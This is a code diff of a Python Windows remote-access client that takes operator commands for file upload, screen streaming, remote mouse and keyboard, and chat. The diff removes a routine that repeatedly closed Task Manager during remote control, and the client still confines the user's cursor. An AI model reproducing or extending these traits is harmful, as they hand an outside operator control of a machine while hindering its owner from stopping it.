@@ -23,22 +23,6 @@ try:
 except Exception:
     _user32 = None
 
-_CLOSE_TM_LAST = 0.0
-
-def _close_taskmgr():
-    global _CLOSE_TM_LAST
-    try:
-        now = time.time()
-        if now - _CLOSE_TM_LAST < 1.0:
-            return
-        if not _user32:
-            return
-        hwnd = _user32.FindWindowW("TaskManagerWindow", None)
-        if hwnd:
-            _user32.PostMessageW(hwnd, 0x0010, 0, 0)
-            _CLOSE_TM_LAST = now
-    except Exception:
-        pass
 
 _chat_window = None
 _chat_messages_text = None
@@ -122,9 +106,13 @@ def _is_safe_path(path):
         "C:\\",
         "D:\\",
         "E:\\",
-        os.environ.get("TEMP", ""),
-        os.environ.get("TMP", ""),
     ]
+    temp = os.environ.get("TEMP", "")
+    tmp = os.environ.get("TMP", "")
+    if temp:
+        allowed_paths.append(temp)
+    if tmp:
+        allowed_paths.append(tmp)
     try:
         abs_path = os.path.abspath(path)
         for allowed in allowed_paths:
@@ -285,21 +273,8 @@ def request_remote_access_permission():
 # ============================================
 
 def connect():
-    global _ctk_root
-
-    def _run_ctk_root():
-        global _ctk_root
-        ctk.set_appearance_mode("dark")
-        ctk.set_default_color_theme("dark-blue")
-        _ctk_root = ctk.CTk()
-        _ctk_root.withdraw()
-        _ctk_root.mainloop()
-
-    threading.Thread(target=_run_ctk_root, daemon=True).start()
-    time.sleep(0.5)
-
     delay_index = 0
-    
+
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -307,7 +282,7 @@ def connect():
             sock.connect((SERVER_IP, SERVER_PORT))
             delay_index = 0
             send_all(sock, json.dumps(get_info()).encode())
-            
+
             current_dir = os.path.expanduser("~")
             streaming_active = threading.Event()
             recv_buffer = b""
@@ -324,7 +299,6 @@ def connect():
                         time.sleep(5)
                         if _user32:
                             _user32.ClipCursor(None)
-                            _close_taskmgr()
                     except Exception:
                         pass
 
@@ -360,23 +334,25 @@ def connect():
                     continue
                 recv_buffer += chunk
                 if len(recv_buffer) > 10 * 1024 * 1024:
-                    recv_buffer = b""
+                    recv_buffer = recv_buffer[-10 * 1024 * 1024:]
                 decoder = json.JSONDecoder()
                 while True:
                     try:
                         first = recv_buffer.find(b"{")
                         if first == -1:
                             break
-                        obj, pos = decoder.raw_decode(recv_buffer[first:].decode("utf-8", errors="surrogateescape"))
+                        decoded = recv_buffer[first:].decode("utf-8", errors="surrogateescape")
+                        obj, pos = decoder.raw_decode(decoded)
                         command = obj
-                        recv_buffer = recv_buffer[first + pos:]
+                        consumed = len(decoded[:pos].encode("utf-8"))
+                        recv_buffer = recv_buffer[first + consumed:]
                     except (json.JSONDecodeError, ValueError, UnicodeDecodeError):
                         break
-                    
+
                     try:
                         if command["action"] == "ping":
                             send_all(sock, json.dumps({"action": "pong"}).encode(), sock_lock)
-                        
+
                         elif command["action"] == "security_info":
                             # Security info request
                             security_data = {
@@ -479,6 +455,11 @@ def connect():
                                     current_upload["received"] += len(data)
                                     send_all(sock, json.dumps({"action": "upload_progress", "received": current_upload["received"], "total": current_upload["total"]}).encode(), sock_lock)
                                 except Exception as e:
+                                    try:
+                                        current_upload["f"].close()
+                                    except Exception:
+                                        pass
+                                    current_upload = None
                                     send_all(sock, json.dumps({"action": "file_error", "error": str(e)}).encode(), sock_lock)
                         
                         elif command["action"] == "upload_end":
@@ -717,21 +698,19 @@ def connect():
                         
                         elif command["action"] == "stop_screen":
                             streaming_active.clear()
-                        
+
                         elif command["action"] == "release_control":
                             try:
                                 if _user32:
                                     _user32.ClipCursor(None)
                                     _user32.keybd_event(0x1B, 0, 0, 0)
                                     _user32.keybd_event(0x1B, 0, 0x0002, 0)
-                                _close_taskmgr()
                             except Exception:
                                 pass
-                        
+
                         elif command["action"] == "remote_mouse":
                             if not _user32:
                                 continue
-                            _close_taskmgr()
                             try:
                                 _user32.ClipCursor(None)
                                 x = command.get("x", 0)
@@ -778,7 +757,6 @@ def connect():
                         elif command["action"] == "remote_key":
                             if not _user32:
                                 continue
-                            _close_taskmgr()
                             try:
                                 key = command.get("key", "")
                                 event = command.get("event", "key_press")
@@ -979,7 +957,7 @@ if not exist "{current_exe}" (
                             pass
             if restart_requested:
                 delay_index = 0
-                continue
+            continue
         except Exception as e:
             delay = RECONNECT_DELAYS[min(delay_index, len(RECONNECT_DELAYS) - 1)]
             time.sleep(delay)
@@ -1069,7 +1047,7 @@ def get_system_stats():
             for line in output.split('\n'):
                 if 'LoadPercentage=' in line:
                     stats["cpu"]["usage"] = line.split('=')[1].strip() + "%"
-                if 'Name=' in line and stats["cpu"].get("name"):
+                if 'Name=' in line:
                     stats["cpu"]["name"] = line.split('=')[1].strip()
         stats["cpu"]["name"] = platform.processor() or "Unknown"
     except Exception:
@@ -1243,6 +1221,12 @@ def _safe_send(sock, data):
 def show_chat_notification(message):
     """Live chat window with customtkinter"""
     global _chat_window, _chat_messages_text, _chat_sock
+    if _ctk_root is None:
+        return
+    _ctk_root.after(0, _show_chat_impl, message)
+
+def _show_chat_impl(message):
+    global _chat_window, _chat_messages_text, _chat_sock
     try:
         if _chat_window is not None:
             try:
@@ -1295,8 +1279,6 @@ def show_chat_notification(message):
                                  border_color="#20324f", border_width=1, corner_radius=8)
         msg_entry.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 5), pady=12, ipady=6)
 
-        _sock_ref = _chat_sock
-
         def _send_reply(event=None):
             msg = msg_entry.get().strip()
             if not msg:
@@ -1305,8 +1287,8 @@ def show_chat_notification(message):
             _append_chat_message("You", msg)
             try:
                 payload = json.dumps({"action": "chat_client_msg", "message": msg}).encode()
-                if _sock_ref:
-                    threading.Thread(target=_safe_send, args=(_sock_ref, payload), daemon=True).start()
+                if _chat_sock:
+                    threading.Thread(target=_safe_send, args=(_chat_sock, payload), daemon=True).start()
             except Exception:
                 pass
 
@@ -1347,4 +1329,12 @@ if __name__ == "__main__":
         sys.exit(0)
     if not request_remote_access_permission():
         sys.exit(0)
-    connect()
+
+    ctk.set_appearance_mode("dark")
+    ctk.set_default_color_theme("dark-blue")
+    _ctk_root = ctk.CTk()
+    _ctk_root.withdraw()
+
+    threading.Thread(target=connect, daemon=True).start()
+
+    _ctk_root.mainloop()
